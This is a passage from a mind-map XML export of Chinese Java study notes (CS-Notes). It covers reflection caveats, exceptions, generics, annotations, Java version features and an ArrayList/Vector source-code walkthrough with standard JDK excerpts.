      尽管反射非常强大，但也不能滥用。如果一个功能可以不用反射完成，那么最好就不用。在我们使用反射技术时，下面几条内容应该牢记于心。
    </p>
    <ul dir="auto">
      <li>
        <p dir="auto">
          <strong>性能开销</strong>&#xa0;：反射涉及了动态类型的解析，所以 JVM 无法对这些代码进行优化。因此，反射操作的效率要比那些非反射操作低得多。我们应该避免在经常被执行的代码或对性能要求很高的程序中使用反射。
        </p>
      </li>
      <li>
        <p dir="auto">
          <strong>安全限制</strong>&#xa0;：使用反射技术要求程序必须在一个没有安全限制的环境中运行。如果一个程序必须在有安全限制的环境中运行，如 Applet，那么这就是个问题了。
        </p>
      </li>
      <li>
        <p dir="auto">
          <strong>内部暴露</strong>&#xa0;：由于反射允许代码执行一些在正常情况下不被允许的操作（比如访问私有的属性和方法），所以使用反射可能会导致意料之外的副作用，这可能导致代码功能失调并破坏可移植性。反射代码破坏了抽象性，因此当平台发生改变的时候，代码的行为就有可能也随着变化。
        </p>
      </li>
      <li>
        <p dir="auto">
          <a href="https://docs.oracle.com/javase/tutorial/reflect/index.html" rel="nofollow">Trail: The Reflection API</a>
        </p>
      </li>
      <li>
        <p dir="auto">
          <a href="http://www.sczyh30.com/posts/Java/java-reflection-1/" rel="nofollow">深入解析 Java 反射（1）- 基础</a>
        </p>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_1937233127" CREATED="1754750650361" MODIFIED="1754750650363"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      八、异常
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 八、异常" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%9F%BA%E7%A1%80.md#八异常">
</a>
    <p dir="auto">
      Throwable 可以用来表示任何可以作为异常抛出的类，分为两种： <strong>Error</strong>&#xa0;和 <strong>Exception</strong>。其中 Error 用来表示 JVM 无法处理的错误，Exception 分为两种：
    </p>
    <ul dir="auto">
      <li>
        <strong>受检异常</strong>&#xa0;：需要用 try...catch... 语句捕获并进行处理，并且可以从异常中恢复；
      </li>
      <li>
        <strong>非受检异常</strong>&#xa0;：是程序运行时错误，例如除 0 会引发 Arithmetic Exception，此时程序崩溃并且无法恢复。
      </li>
    </ul>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/1eb5d3835ef646763ce907efd3174ca4407417c5a4e698ddd9d03b7f9ca8e51f/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f50506a77502e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/1eb5d3835ef646763ce907efd3174ca4407417c5a4e698ddd9d03b7f9ca8e51f/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f50506a77502e706e67" width="600" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/PPjwP.png"/>
    </a><br/>
    

    <ul dir="auto">
      <li>
        <p dir="auto">
          <a href="https://www.journaldev.com/2167/java-exception-interview-questions-and-answersl" rel="nofollow">Java Exception Interview Questions and Answers</a>
        </p>
      </li>
      <li>
        <p dir="auto">
          <a href="https://www.cnblogs.com/Qian123/p/5715402.html" rel="nofollow">Java提高篇——Java 异常处理</a>
        </p>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_600093060" CREATED="1754750650363" MODIFIED="1754750650365"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      九、泛型
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 九、泛型" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%9F%BA%E7%A1%80.md#九泛型">
</a>
    <pre>public class Box&lt;T&gt; {
    // T stands for &quot;Type&quot;
    private T t;
    public void set(T t) { this.t = t; }
    public T get() { return t; }
}</pre>
    <ul dir="auto">
      <li>
        <a href="https://www.cnblogs.com/Blue-Keroro/p/8875898.html" rel="nofollow">Java 泛型详解</a>
      </li>
      <li>
        <a href="https://cloud.tencent.com/developer/article/1033693" rel="nofollow">10 道 Java 泛型面试题</a>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_668036999" CREATED="1754750650366" MODIFIED="1754750650367"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      十、注解
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 十、注解" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%9F%BA%E7%A1%80.md#十注解">
</a>
    <p dir="auto">
      Java 注解是附加在代码中的一些元信息，用于一些工具在编译、运行时进行解析和使用，起到说明、配置的功能。注解不会也不能影响代码的实际逻辑，仅仅起到辅助性的作用。
    </p>
    <p dir="auto">
      <a href="https://www.cnblogs.com/acm-bingzi/p/javaAnnotation.html" rel="nofollow">注解 Annotation 实现原理与自定义注解例子</a>
    </p>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_1290214424" CREATED="1754750650368" MODIFIED="1754750650368"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      十一、特性
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1346753687" CREATED="1754750650369" MODIFIED="1754750650371"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Java 各版本的新特性
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Java 各版本的新特性" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%9F%BA%E7%A1%80.md#java-各版本的新特性">
</a>
    <p dir="auto">
      <strong>New highlights in Java SE 8</strong>
    </p>
    <ol dir="auto">
      <li>
        Lambda Expressions
      </li>
      <li>
        Pipelines and Streams
      </li>
      <li>
        Date and Time API
      </li>
      <li>
        Default Methods
      </li>
      <li>
        Type Annotations
      </li>
      <li>
        Nashhorn JavaScript Engine
      </li>
      <li>
        Concurrent Accumulators
      </li>
      <li>
        Parallel operations
      </li>
      <li>
        PermGen Error Removed
      </li>
    </ol>
    <p dir="auto">
      <strong>New highlights in Java SE 7</strong>
    </p>
    <ol dir="auto">
      <li>
        Strings in Switch Statement
      </li>
      <li>
        Type Inference for Generic Instance Creation
      </li>
      <li>
        Multiple Exception Handling
      </li>
      <li>
        Support for Dynamic Languages
      </li>
      <li>
        Try with Resources
      </li>
      <li>
        Java nio Package
      </li>
      <li>
        Binary Literals, Underscore in literals
      </li>
      <li>
        Diamond Syntax
      </li>
    </ol>
    <ul dir="auto">
      <li>
        <a href="http://www.selfgrowth.com/articles/difference-between-java-18-and-java-17" rel="nofollow">Difference between Java 1.8 and Java 1.7?</a>
      </li>
      <li>
        <a href="http://www.importnew.com/19345.html" rel="nofollow">Java 8 特性</a>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_1181868076" CREATED="1754750650372" MODIFIED="1754750650374"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Java 与 C++ 的区别
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Java 与 C++ 的区别" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%9F%BA%E7%A1%80.md#java-与-c-的区别">
</a>
    <ul dir="auto">
      <li>
        Java 是纯粹的面向对象语言，所有的对象都继承自 java.lang.Object，C++ 为了兼容 C 即支持面向对象也支持面向过程。
      </li>
      <li>
        Java 通过虚拟机从而实现跨平台特性，但是 C++ 依赖于特定的平台。
      </li>
      <li>
        Java 没有指针，它的引用可以理解为安全指针，而 C++ 具有和 C 一样的指针。
      </li>
      <li>
        Java 支持自动垃圾回收，而 C++ 需要手动回收。
      </li>
      <li>
        Java 不支持多重继承，只能通过实现多个接口来达到相同目的，而 C++ 支持多重继承。
      </li>
      <li>
        Java 不支持操作符重载，虽然可以对两个 String 对象执行加法运算，但是这是语言内置支持的操作，不属于操作符重载，而 C++ 可以。
      </li>
      <li>
        Java 的 goto 是保留字，但是不可用，C++ 可以使用 goto。
      </li>
    </ul>
    <p dir="auto">
      <a href="http://cs-fundamentals.com/tech-interview/java/differences-between-java-and-cpp.php" rel="nofollow">What are the main differences between Java and C++?</a>
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1973540251" CREATED="1754750650375" MODIFIED="1754750650376"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      JRE or JDK
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: JRE or JDK" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%9F%BA%E7%A1%80.md#jre-or-jdk">
</a>
    <ul dir="auto">
      <li>
        JRE：Java Runtime Environment，Java 运行环境的简称，为 Java 的运行提供了所需的环境。它是一个 JVM 程序，主要包括了 JVM 的标准实现和一些 Java 基本类库。
      </li>
      <li>
        JDK：Java Development Kit，Java 开发工具包，提供了 Java 的开发及运行环境。JDK 是 Java 开发的核心，集成了 JRE 以及一些其它的工具，比如编译 Java 源码的编译器 javac 等。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_507343949" CREATED="1754750650377" MODIFIED="1754750650379"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      参考资料
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 参考资料" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%9F%BA%E7%A1%80.md#参考资料">
</a>
    <ul dir="auto">
      <li>
        Eckel B. Java 编程思想[M]. 机械工业出版社, 2002.
      </li>
      <li>
        Bloch J. Effective java[M]. Addison-Wesley Professional, 2017.
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1345391573" CREATED="1754749807830" MODIFIED="1754750663540" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%AE%B9%E5%99%A8.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Java 容器
    </p>
  </body>
</html>
</richcontent>
<node FOLDED="true" ID="ID_994872491" CREATED="1754750650382" MODIFIED="1754750650384"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      一、概览
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 一、概览" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%AE%B9%E5%99%A8.md#一概览">
</a>
    <p dir="auto">
      容器主要包括 Collection 和 Map 两种，Collection 存储着对象的集合，而 Map 存储着键值对（两个对象）的映射表。
    </p>
  </body>
</html></richcontent>
<node FOLDED="true" ID="ID_629055028" CREATED="1754750650384" MODIFIED="1754750650386"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Collection
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Collection" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%AE%B9%E5%99%A8.md#collection">
</a><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/c19c66fa5298d814e4b4783186cc24b71894a4b6e98b75f6397385a1741a4524/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230383232303934383038342e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/c19c66fa5298d814e4b4783186cc24b71894a4b6e98b75f6397385a1741a4524/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230383232303934383038342e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20191208220948084.png"/></a><br/>  </body>
</html></richcontent>
<node ID="ID_1046956678" CREATED="1754750650386" MODIFIED="1754750650390"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. Set
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. Set" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%AE%B9%E5%99%A8.md#1-set">
</a>
    <ul dir="auto">
      <li>
        <p dir="auto">
          TreeSet：基于红黑树实现，支持有序性操作，例如根据一个范围查找元素的操作。但是查找效率不如 HashSet，HashSet 查找的时间复杂度为 O(1)，TreeSet 则为 O(logN)。
        </p>
      </li>
      <li>
        <p dir="auto">
          HashSet：基于哈希表实现，支持快速查找，但不支持有序性操作。并且失去了元素的插入顺序信息，也就是说使用 Iterator 遍历 HashSet 得到的结果是不确定的。
        </p>
      </li>
      <li>
        <p dir="auto">
          LinkedHashSet：具有 HashSet 的查找效率，并且内部使用双向链表维护元素的插入顺序。
        </p>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_1436284867" CREATED="1754750650390" MODIFIED="1754750650392"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. List
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. List" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%AE%B9%E5%99%A8.md#2-list">
</a>
    <ul dir="auto">
      <li>
        <p dir="auto">
          ArrayList：基于动态数组实现，支持随机访问。
        </p>
      </li>
      <li>
        <p dir="auto">
          Vector：和 ArrayList 类似，但它是线程安全的。
        </p>
      </li>
      <li>
        <p dir="auto">
          LinkedList：基于双向链表实现，只能顺序访问，但是可以快速地在链表中间插入和删除元素。不仅如此，LinkedList 还可以用作栈、队列和双向队列。
        </p>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_1616981116" CREATED="1754750650392" MODIFIED="1754750650394"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. Queue
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. Queue" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%AE%B9%E5%99%A8.md#3-queue">
</a>
    <ul dir="auto">
      <li>
        <p dir="auto">
          LinkedList：可以用它来实现双向队列。
        </p>
      </li>
      <li>
        <p dir="auto">
          PriorityQueue：基于堆结构实现，可以用它来实现优先队列。
        </p>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_1703518499" CREATED="1754750650395" MODIFIED="1754750650397"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Map
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Map" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%AE%B9%E5%99%A8.md#map">
</a><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/a170083561a559f5ff6cfcae36c58334e92178a2feb4e664ad89c367c352cff5/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303230313130313233343333353833372e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/a170083561a559f5ff6cfcae36c58334e92178a2feb4e664ad89c367c352cff5/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303230313130313233343333353833372e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20201101234335837.png"/></a><br/>
    <ul dir="auto">
      <li>
        <p dir="auto">
          TreeMap：基于红黑树实现。
        </p>
      </li>
      <li>
        <p dir="auto">
          HashMap：基于哈希表实现。
        </p>
      </li>
      <li>
        <p dir="auto">
          HashTable：和 HashMap 类似，但它是线程安全的，这意味着同一时刻多个线程同时写入 HashTable 不会导致数据不一致。它是遗留类，不应该去使用它，而是使用 ConcurrentHashMap 来支持线程安全，ConcurrentHashMap 的效率会更高，因为 ConcurrentHashMap 引入了分段锁。
        </p>
      </li>
      <li>
        <p dir="auto">
          LinkedHashMap：使用双向链表来维护元素的顺序，顺序为插入顺序或者最近最少使用（LRU）顺序。
        </p>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1597538862" CREATED="1754750650397" MODIFIED="1754750650397"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      二、容器中的设计模式
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1826629738" CREATED="1754750650399" MODIFIED="1754750650400"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      迭代器模式
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 迭代器模式" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%AE%B9%E5%99%A8.md#迭代器模式">
</a><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/43c37ab02a2b5f88aa230642a923049d0b8815359e6048765736e8a3a56ee49f/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230383232353330313937332e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/43c37ab02a2b5f88aa230642a923049d0b8815359e6048765736e8a3a56ee49f/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230383232353330313937332e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20191208225301973.png"/></a><br/>
    <p dir="auto">
      Collection 继承了 Iterable 接口，其中的 iterator() 方法能够产生一个 Iterator 对象，通过这个对象就可以迭代遍历 Collection 中的元素。
    </p>
    <p dir="auto">
      从 JDK 1.5 之后可以使用 foreach 方法来遍历实现了 Iterable 接口的聚合对象。
    </p>
    <pre>List&lt;String&gt; list = new ArrayList&lt;&gt;();
list.add(&quot;a&quot;);
list.add(&quot;b&quot;);
for (String item : list) {
    System.out.println(item);
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1649752938" CREATED="1754750650401" MODIFIED="1754750650403"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      适配器模式
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 适配器模式" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%AE%B9%E5%99%A8.md#适配器模式">
</a>
    <p dir="auto">
      java.util.Arrays#asList() 可以把数组类型转换为 List 类型。
    </p>
    <pre>@SafeVarargs
public static &lt;T&gt; List&lt;T&gt; asList(T... a)</pre>
    <p dir="auto">
      应该注意的是 asList() 的参数为泛型的变长参数，不能使用基本类型数组作为参数，只能使用相应的包装类型数组。
    </p>
    <pre>Integer[] arr = {1, 2, 3};
List list = Arrays.asList(arr);</pre>
    <p dir="auto">
      也可以使用以下方式调用 asList()：
    </p>
    <pre>List list = Arrays.asList(1, 2, 3);</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1665420548" CREATED="1754750650403" MODIFIED="1754750650405"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      三、源码分析
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 三、源码分析" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%AE%B9%E5%99%A8.md#三源码分析">
</a>
    <p dir="auto">
      如果没有特别说明，以下源码分析基于 JDK 1.8。
    </p>
    <p dir="auto">
      在 IDEA 中 double shift 调出 Search EveryWhere，查找源码文件，找到之后就可以阅读源码。
    </p>
  </body>
</html></richcontent>
<node FOLDED="true" ID="ID_1177056107" CREATED="1754750650405" MODIFIED="1754750650405"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      ArrayList
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_763243419" CREATED="1754750650407" MODIFIED="1754750650408"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 概览
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 概览" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%AE%B9%E5%99%A8.md#1-概览">
</a>
    <p dir="auto">
      因为 ArrayList 是基于数组实现的，所以支持快速随机访问。RandomAccess 接口标识着该类支持快速随机访问。
    </p>
    <pre>public class ArrayList&lt;E&gt; extends AbstractList&lt;E&gt;
        implements List&lt;E&gt;, RandomAccess, Cloneable, java.io.Serializable</pre>
    <p dir="auto">
      数组的默认大小为 10。
    </p>
    <pre>private static final int DEFAULT_CAPACITY = 10;</pre>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/b832b8aef98c0618c4ee55b53695e7b4ad12acd4e8d92f85726173954e133d91/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230383233323232313236352e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/b832b8aef98c0618c4ee55b53695e7b4ad12acd4e8d92f85726173954e133d91/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230383233323232313236352e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20191208232221265.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_1526407416" CREATED="1754750650409" MODIFIED="1754750650411"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 扩容
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 扩容" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%AE%B9%E5%99%A8.md#2-扩容">
</a>
    <p dir="auto">
      添加元素时使用 ensureCapacityInternal() 方法来保证容量足够，如果不够时，需要使用 grow() 方法进行扩容，新容量的大小为 <code>oldCapacity + (oldCapacity &gt;&gt; 1)</code>，即 oldCapacity+oldCapacity/2。其中 oldCapacity &gt;&gt; 1 需要取整，所以新容量大约是旧容量的 1.5 倍左右。（oldCapacity 为偶数就是 1.5 倍，为奇数就是 1.5 倍-0.5）
    </p>
    <p dir="auto">
      扩容操作需要调用 <code>Arrays.copyOf()</code>&#xa0;把原数组整个复制到新数组中，这个操作代价很高，因此最好在创建 ArrayList 对象时就指定大概的容量大小，减少扩容操作的次数。
    </p>
    <pre>public boolean add(E e) {
    ensureCapacityInternal(size + 1);  // Increments modCount!!
    elementData[size++] = e;
    return true;
}
private void ensureCapacityInternal(int minCapacity) {
    if (elementData == DEFAULTCAPACITY_EMPTY_ELEMENTDATA) {
        minCapacity = Math.max(DEFAULT_CAPACITY, minCapacity);
    }
    ensureExplicitCapacity(minCapacity);
}
private void ensureExplicitCapacity(int minCapacity) {
    modCount++;
    // overflow-conscious code
    if (minCapacity - elementData.length &gt; 0)
        grow(minCapacity);
}
private void grow(int minCapacity) {
    // overflow-conscious code
    int oldCapacity = elementData.length;
    int newCapacity = oldCapacity + (oldCapacity &gt;&gt; 1);
    if (newCapacity - minCapacity &lt; 0)
        newCapacity = minCapacity;
    if (newCapacity - MAX_ARRAY_SIZE &gt; 0)
        newCapacity = hugeCapacity(minCapacity);
    // minCapacity is usually close to size, so this is a win:
    elementData = Arrays.copyOf(elementData, newCapacity);
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1124546268" CREATED="1754750650411" MODIFIED="1754750650413"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 删除元素
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. 删除元素" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%AE%B9%E5%99%A8.md#3-删除元素">
</a>
    <p dir="auto">
      需要调用 System.arraycopy() 将 index+1 后面的元素都复制到 index 位置上，该操作的时间复杂度为 O(N)，可以看到 ArrayList 删除元素的代价是非常高的。
    </p>
    <pre>public E remove(int index) {
    rangeCheck(index);
    modCount++;
    E oldValue = elementData(index);
    int numMoved = size - index - 1;
    if (numMoved &gt; 0)
        System.arraycopy(elementData, index+1, elementData, index, numMoved);
    elementData[--size] = null; // clear to let GC do its work
    return oldValue;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_372474358" CREATED="1754750650414" MODIFIED="1754750650415"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. 序列化
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 4. 序列化" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%AE%B9%E5%99%A8.md#4-序列化">
</a>
    <p dir="auto">
      ArrayList 基于数组实现，并且具有动态扩容特性，因此保存元素的数组不一定都会被使用，那么就没必要全部进行序列化。
    </p>
    <p dir="auto">
      保存元素的数组 elementData 使用 transient 修饰，该关键字声明数组默认不会被序列化。
    </p>
    <pre>transient Object[] elementData; // non-private to simplify nested class access</pre>
    <p dir="auto">
      ArrayList 实现了 writeObject() 和 readObject() 来控制只序列化数组中有元素填充那部分内容。
    </p>
    <pre>private void readObject(java.io.ObjectInputStream s)
    throws java.io.IOException, ClassNotFoundException {
    elementData = EMPTY_ELEMENTDATA;
    // Read in size, and any hidden stuff
    s.defaultReadObject();
    // Read in capacity
    s.readInt(); // ignored
    if (size &gt; 0) {
        // be like clone(), allocate array based upon size not capacity
        ensureCapacityInternal(size);
        Object[] a = elementData;
        // Read in all elements in the proper order.
        for (int i=0; i&lt;size; i++) {
            a[i] = s.readObject();
        }
    }
}</pre>
    <pre>private void writeObject(java.io.ObjectOutputStream s)
    throws java.io.IOException{
    // Write out element count, and any hidden stuff
    int expectedModCount = modCount;
    s.defaultWriteObject();
    // Write out size as capacity for behavioural compatibility with clone()
    s.writeInt(size);
    // Write out all elements in the proper order.
    for (int i=0; i&lt;size; i++) {
        s.writeObject(elementData[i]);
    }
    if (modCount != expectedModCount) {
        throw new ConcurrentModificationException();
    }
}</pre>
    <p dir="auto">
      序列化时需要使用 ObjectOutputStream 的 writeObject() 将对象转换为字节流并输出。而 writeObject() 方法在传入的对象存在 writeObject() 的时候会去反射调用该对象的 writeObject() 来实现序列化。反序列化使用的是 ObjectInputStream 的 readObject() 方法，原理类似。
    </p>
    <pre>ArrayList list = new ArrayList();
ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(file));
oos.writeObject(list);</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_390271525" CREATED="1754750650416" MODIFIED="1754750650417"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      5. Fail-Fast
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 5. Fail-Fast" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%AE%B9%E5%99%A8.md#5-fail-fast">
</a>
    <p dir="auto">
      modCount 用来记录 ArrayList 结构发生变化的次数。结构发生变化是指添加或者删除至少一个元素的所有操作，或者是调整内部数组的大小，仅仅只是设置元素的值不算结构发生变化。
    </p>
    <p dir="auto">
      在进行序列化或者迭代等操作时，需要比较操作前后 modCount 是否改变，如果改变了需要抛出 ConcurrentModificationException。代码参考上节序列化中的 writeObject() 方法。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1037028629" CREATED="1754750650418" MODIFIED="1754750650418"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Vector
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_957486276" CREATED="1754750650419" MODIFIED="1754750650421"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 同步
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 同步" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%AE%B9%E5%99%A8.md#1-同步">
</a>
    <p dir="auto">
      它的实现与 ArrayList 类似，但是使用了 synchronized 进行同步。
    </p>
    <pre>public synchronized boolean add(E e) {
    modCount++;
    ensureCapacityHelper(elementCount + 1);
    elementData[elementCount++] = e;
    return true;
}
public synchronized E get(int index) {
    if (index &gt;= elementCount)
